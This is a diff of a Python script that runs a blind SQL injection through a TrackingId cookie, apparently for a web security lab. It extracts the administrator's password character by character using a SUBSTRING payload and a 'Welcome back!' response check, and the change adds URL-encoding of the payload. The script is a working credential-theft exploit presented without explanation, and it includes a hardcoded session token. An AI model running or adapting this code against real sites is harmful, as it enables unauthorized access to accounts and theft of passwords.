@@ -3,6 +3,7 @@ import requests
 import string
 import time
 import urllib3 
+import urllib
 # I want to perform cluster comb attack to 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -15,7 +16,8 @@ def sqli_password(url):
         for j in range(32, 127):
             c = chr(j) 
             payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1)='{c}'-- "
-            cookies = {'TrackingId': f"LCmPwM5sbGgGTWHz{payload}", 'session': 'nVv9ss2PgSytL7GtOi6D48ErNIcpQeAY'}
+            encoded_payload = urllib.parse.quote(payload)
+            cookies = {'TrackingId': f"LCmPwM5sbGgGTWHz{encoded_payload}", 'session': 'nVv9ss2PgSytL7GtOi6D48ErNIcpQeAY'}
             response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
             if "Welcome back!" in response.text: 
                 password_extracted += c
